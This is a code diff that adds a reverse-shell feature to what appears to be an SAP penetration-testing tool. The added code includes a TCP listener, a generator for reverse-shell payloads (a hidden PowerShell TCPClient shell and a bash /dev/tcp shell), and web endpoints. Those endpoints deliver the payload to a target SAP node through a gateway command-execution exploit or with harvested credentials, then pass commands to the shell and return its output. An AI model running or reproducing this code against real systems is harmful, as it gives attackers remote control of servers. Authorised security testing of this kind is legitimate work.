@@ -194,6 +194,157 @@ def _bg(key: str, label: str, fn):
 
 
 # ===========================================================================
+# Reverse Shell Session
+# ===========================================================================
+
+import socket as _socket_mod
+
+_shell_session = None
+_shell_lock = threading.Lock()
+
+
+class ShellSession:
+    """Manages a single reverse shell TCP connection."""
+
+    def __init__(self, listen_port: int, target_sid: str):
+        self.listen_port = listen_port
+        self.target_sid = target_sid
+        self.status = "idle"       # idle/waiting/connected/disconnected/error
+        self.error_msg = ""
+        self.server_sock = None
+        self.client_sock = None
+        self.client_addr = None
+        self.output_buffer = []
+        self.output_lock = threading.Lock()
+
+    def start_listener(self):
+        """Bind TCP listener and wait for connection in background."""
+        try:
+            self.server_sock = _socket_mod.socket(
+                _socket_mod.AF_INET, _socket_mod.SOCK_STREAM)
+            self.server_sock.setsockopt(
+                _socket_mod.SOL_SOCKET, _socket_mod.SO_REUSEADDR, 1)
+            self.server_sock.bind(("0.0.0.0", self.listen_port))
+            self.server_sock.listen(1)
+            self.status = "waiting"
+            threading.Thread(target=self._listener_loop, daemon=True).start()
+        except OSError as e:
+            self.status = "error"
+            self.error_msg = f"Cannot bind port {self.listen_port}: {e}"
+
+    def _listener_loop(self):
+        try:
+            self.server_sock.settimeout(120)
+            self.client_sock, self.client_addr = self.server_sock.accept()
+            self.status = "connected"
+            self.server_sock.close()
+            self.server_sock = None
+            threading.Thread(target=self._reader_loop, daemon=True).start()
+        except _socket_mod.timeout:
+            self.status = "error"
+            self.error_msg = "Timeout — no reverse shell connection received"
+            self._close_server()
+        except Exception as e:
+            self.status = "error"
+            self.error_msg = str(e)
+            self._close_server()
+
+    def _reader_loop(self):
+        try:
+            while self.status == "connected":
+                data = self.client_sock.recv(4096)
+                if not data:
+                    self.status = "disconnected"
+                    break
+                with self.output_lock:
+                    self.output_buffer.append(
+                        data.decode("utf-8", errors="replace"))
+        except Exception:
+            if self.status == "connected":
+                self.status = "disconnected"
+
+    def send_input(self, text: str):
+        if self.status == "connected" and self.client_sock:
+            try:
+                self.client_sock.sendall((text + "\n").encode())
+            except Exception:
+                self.status = "disconnected"
+
+    def get_output(self) -> str:
+        with self.output_lock:
+            out = "".join(self.output_buffer)
+            self.output_buffer.clear()
+            return out
+
+    def stop(self):
+        self.status = "disconnected"
+        self._close_client()
+        self._close_server()
+
+    def _close_server(self):
+        if self.server_sock:
+            try:
+                self.server_sock.close()
+            except Exception:
+                pass
+            self.server_sock = None
+
+    def _close_client(self):
+        if self.client_sock:
+            try:
+                self.client_sock.close()
+            except Exception:
+                pass
+            self.client_sock = None
+
+
+def _detect_local_ip(target_host: str, saprouter: str = "") -> str:
+    """Detect which local IP can reach the target (or SAProuter first hop)."""
+    # For SAProuter, we need to reach the router, not the final target
+    reach_host = target_host
+    if saprouter:
+        try:
+            from sap_saprouter import parse_route_string
+            hops = parse_route_string(saprouter + f"/H/{target_host}/S/3200")
+            reach_host = hops[0]["host"]
+        except Exception:
+            pass
+    try:
+        s = _socket_mod.socket(_socket_mod.AF_INET, _socket_mod.SOCK_DGRAM)
+        s.connect((reach_host, 1))
+        local_ip = s.getsockname()[0]
+        s.close()
+        return local_ip
+    except Exception:
+        return "127.0.0.1"
+
+
+def _generate_payload(os_type: str, ip: str, port: int) -> dict:
+    """Generate reverse shell payload based on OS type."""
+    is_win = any(w in (os_type or "").lower() for w in ("windows", "nt", "win"))
+    if is_win:
+        ps = (f"$c=New-Object Net.Sockets.TCPClient('{ip}',{port});"
+              f"$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};"
+              f"while(($i=$s.Read($b,0,$b.Length))-ne 0){{"
+              f"$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);"
+              f"$r=(iex $d 2>&1|Out-String);"
+              f"$p=$r+'PS '+$(pwd).Path+'> ';"
+              f"$t=([text.encoding]::ASCII).GetBytes($p);"
+              f"$s.Write($t,0,$t.Length);$s.Flush()}};$c.Close()")
+        return {
+            "command": "cmd.exe",
+            "params": f"/C powershell -nop -w hidden -c \"{ps}\"",
+            "display": f"PowerShell reverse shell → {ip}:{port}",
+        }
+    else:
+        return {
+            "command": "/bin/sh",
+            "params": f"-c /bin/bash -i >& /dev/tcp/{ip}/{port} 0>&1",
+            "display": f"Bash reverse shell → {ip}:{port}",
+        }
+
+
+# ===========================================================================
 # SAPMAPApi — Backend controller
 # ===========================================================================
 
@@ -1043,6 +1194,113 @@ def create_app(api: SAPMAPApi) -> Bottle:
             return json.dumps({"error": f"Unknown method: {method}"})
 
         return json.dumps(result)
+
+    # -- Reverse Shell endpoints --
+
+    @app.route("/api/shell/detect_ip", method="GET")
+    def shell_detect_ip():
+        response.content_type = "application/json"
+        target = request.params.get("target", "")
+        saprouter = request.params.get("saprouter", "")
+        ip = _detect_local_ip(target, saprouter)
+        return json.dumps({"local_ip": ip})
+
+    @app.route("/api/shell/start", method="POST")
+    def shell_start():
+        global _shell_session
+        response.content_type = "application/json"
+        data = request.json or {}
+        sid = data.get("sid", "")
+        method = data.get("method", "gateway")
+        listen_port = int(data.get("listen_port", 4444))
+        local_ip = data.get("local_ip", "127.0.0.1")
+
+        node = api.state.get_node(sid)
+        if not node:
+            return json.dumps({"error": f"Node {sid} not found"})
+
+        with _shell_lock:
+            if _shell_session and _shell_session.status in ("waiting", "connected"):
+                return json.dumps({"error": "A shell session is already active. "
+                                             "Stop it first."})
+            session = ShellSession(listen_port, sid)
+            session.start_listener()
+            if session.status == "error":
+                return json.dumps({"error": session.error_msg})
+            _shell_session = session
+
+        # Generate and send payload in background
+        def _send():
+            payload = _generate_payload(node.os_type, local_ip, listen_port)
+            print(f"[*] {sid}: Sending reverse shell payload: "
+                  f"{payload['display']}")
+            print(f"    Listening on 0.0.0.0:{listen_port}")
+
+            if method == "gateway":
+                result = sapmap_exploit.execute_gw_command(
+                    node, payload["command"], payload["params"])
+            else:
+                creds = node.best_credentials()
+                if not creds:
+                    print(f"[-] {sid}: No credentials for SXPG shell")
+                    return
+                result = sapmap_rfc.execute_local_command(
+                    node, payload["command"], payload["params"], creds)
+
+            if result.get("success"):
+                print(f"[+] {sid}: Reverse shell payload delivered")
+            else:
+                print(f"[-] {sid}: Payload delivery failed: "
+                      f"{result.get('error', 'unknown')}")
+
+        threading.Thread(target=_send, daemon=True).start()
+        return json.dumps({"status": "ok", "port": listen_port})
+
+    @app.route("/api/shell/status", method="GET")
+    def shell_status():
+        response.content_type = "application/json"
+        with _shell_lock:
+            if not _shell_session:
+                return json.dumps({"active": False})
+            return json.dumps({
+                "active": True,
+                "status": _shell_session.status,
+                "target_sid": _shell_session.target_sid,
+                "listen_port": _shell_session.listen_port,
+                "client_addr": (f"{_shell_session.client_addr[0]}:"
+                                f"{_shell_session.client_addr[1]}"
+                                if _shell_session.client_addr else ""),
+                "error": _shell_session.error_msg,
+            })
+
+    @app.route("/api/shell/output", method="GET")
+    def shell_output():
+        response.content_type = "application/json"
+        with _shell_lock:
+            if not _shell_session:
+                return json.dumps({"output": ""})
+            return json.dumps({"output": _shell_session.get_output()})
+
+    @app.route("/api/shell/input", method="POST")
+    def shell_input():
+        response.content_type = "application/json"
+        data = request.json or {}
+        text = data.get("text", "")
+        with _shell_lock:
+            if not _shell_session or _shell_session.status != "connected":
+                return json.dumps({"error": "No active shell"})
+            _shell_session.send_input(text)
+        return json.dumps({"status": "ok"})
+
+    @app.route("/api/shell/stop", method="POST")
+    def shell_stop():
+        global _shell_session
+        response.content_type = "application/json"
+        with _shell_lock:
+            if _shell_session:
+                _shell_session.stop()
+                _shell_session = None
+        return json.dumps({"status": "ok"})
 
     @app.route("/api/node/<sid>/download_hashes", method="POST")
     def node_download_hashes(sid):
